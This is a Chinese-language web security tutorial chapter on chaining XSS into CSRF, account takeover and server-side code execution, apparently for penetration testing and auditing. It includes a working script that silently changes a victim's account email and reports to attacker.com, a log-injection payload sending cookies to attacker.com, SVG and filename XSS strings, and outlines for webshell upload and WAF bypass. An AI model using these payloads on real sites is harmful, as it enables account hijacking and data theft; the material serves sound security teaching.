## 十一、XSS→CSRF→账户接管（ATO）完整攻击链

### 11.1 为什么XSS必须链式利用
MSRC（微软安全响应中心）2025年11月专题《Weaponizing XSS》指出：**单个XSS"弹窗"只是POC，真正的危害在于组合链**。现代站点普遍启用HttpOnly+SameSite Cookie，单纯窃取Cookie的路径已收窄，攻击者转向：
- **XSS + CSRF**：在已认证会话中静默执行状态变更请求
- **XSS + 弱会话保护**：会话Cookie未HttpOnly/Secure时才可窃取
- **XSS + 日志注入**：JSON日志编码与HTML日志查看器上下文错配
- **XSS + 文件上传**：SVG XSS + 路径穿越 → 服务端RCE
- **XSS + SSRF**：借受害者浏览器访问内网服务/外带内网文件

### 11.2 攻击链模板：XSS → CSRF → ATO
```
阶段1 XSS立足：在可持久化位置（资料/评论/文件名）植入BeEF hook或自动payload
阶段2 等待高权限受害者访问：存储型XSS天然具备"钓鱼等待"特性
阶段3 静默CSRF（自动化，无需用户交互）：
   - 读取CSRF token（若token在页面/meta/cookie中）
   - 用fetch/XHR带凭据发起敏感操作：改邮箱/改密码/加管理员/提权
阶段4 账号接管完成：攻击者获得受害者账号完全控制权
阶段5 横向：管理员账号 → 后台功能滥用 → RCE（上传webshell/主题注入）
```

### 11.3 完整CSRF自动化payload（改邮箱→接管）
```javascript
// 目标场景：账号设置页存在"修改绑定邮箱"接口（无CSRF防护或token可获取）
<script>
(async () => {
  // 1. 从页面/meta读取CSRF token（若存在）
  const token = document.querySelector('meta[name="csrf-token"]')?.content
              || document.querySelector('input[name="csrf"]')?.value || '';
  // 2. 发起修改邮箱请求
  const res = await fetch('/account/email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json', 'X-CSRF-Token': token},
    body: JSON.stringify({email: '<EMAIL-REDACTED>'})
  });
  // 3. 回传结果（证明链式利用成功）
  new Image().src = 'https://attacker.com/chain?ok=' + (res.ok ? 1 : 0);
})();
</script>
```
**SameSite=Lax绕过思路**（现代站点常见配置）：
- Lax允许顶级导航GET请求携带Cookie → 利用GET型状态变更接口或`<a>`/`location`触发
- 跨站iframe内POST默认不带Cookie，但可先`window.open`导航到同源再执行
- 利用CORS配置缺陷：若同源API允许`Access-Control-Allow-Origin: *` + 无凭据，可完全脱离XSS独立执行CSRF

### 11.4 日志XSS → 管理员ATO（MSRC实战技术）
**技术背景**：JSON序列化库将`<`/`>`转义为`\u003c`/`\u003e`（看起来安全），但日志查看器用HTML渲染时解码还原，导致XSS在管理员浏览器执行：
```json
// 在日志字段注入（JSON Unicode转义形式）
{"event": "\u003cimg src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\"\u003e"}
```
**审计点**：搜`\u003c`/JSON.stringify的输出进入`innerHTML`渲染的日志/监控/审计页面；`<script type="application/json">`内嵌数据的HTML转义与JS解析上下文错配。

### 11.5 XSS + 文件上传 → RCE
```
1. 发现SVG/HTML文件上传点（头像/签名/附件预览）
2. 上传恶意SVG：<svg xmlns="http://www.w3.org/2000/svg"><script>...</script></svg>
3. 管理后台预览/下载时触发XSS（借管理员会话）
4. 借管理员会话利用文件上传/路径穿越漏洞写入webshell
5. 服务端RCE
```
**测试要点**：文件名XSS（`"><img src=x onerror=alert(1)>.png`）、文件内容XSS（SVG/HTML）、文件类型混淆（`text/html`内容改`.jpg`扩展名+Content-Type嗅探）。

### 11.6 Self-XSS 升级链（实战案例：Akamai WAF绕过→CSRF→ATO）
```
1. 发现Self-XSS点（仅自己能触发，如个人偏好设置回显）
2. WAF绕过：修改请求格式（JSON vs 表单）触发403与200的差异 → 找到WAF不拦截的编码形态
3. 注入存储型payload（绕WAF后在偏好字段持久化）
4. CSRF链：利用登录态Cookie机制（cookie与header token匹配检查）构造跨站请求
5. 其他用户访问时触发 → 批量账户接管
```
**要点**：Self-XSS不因"影响自己"而低危——任何存储型传播面都会升级为实际危害。

